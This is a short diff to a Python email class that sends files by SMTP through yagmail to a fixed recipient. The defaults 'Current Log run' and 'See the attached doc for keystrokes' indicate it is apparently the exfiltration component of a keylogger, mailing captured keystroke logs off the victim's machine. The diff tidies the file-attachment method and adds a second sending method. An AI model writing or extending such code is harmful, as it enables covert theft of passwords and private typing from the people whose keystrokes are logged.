@@ -9,14 +9,25 @@ class Email:
         self.my_email = my_email  # sender
         self.to_email = to_email  # recepient email
 
-    def send_email_with_file(self, filename, this_subj="Current Log run", body="See the attached doc for keystrokes", ):
+    def send_email_with_file(self, filename, this_subj="Current Log run", body="See the attached doc for keystrokes"):
         """
-        Sends email to email to the log email specified in the program
+        Sends email with attacachment to the specified reciever email
         """
         yag = yagmail.SMTP(self.my_email)
         yag.send(
             to=self.to_email,
             subject=this_subj,
             contents=body, 
-            attachments=filename,
+            attachments=filename
+        )
+    
+    def send_email(self, this_subj="Current Log run", body="See the attached doc for keystrokes"):
+        """
+        Sends email to the specified reciever email
+        """
+        yag = yagmail.SMTP(self.my_email)
+        yag.send(
+            to=self.to_email,
+            subject=this_subj,
+            contents=body, 
         )
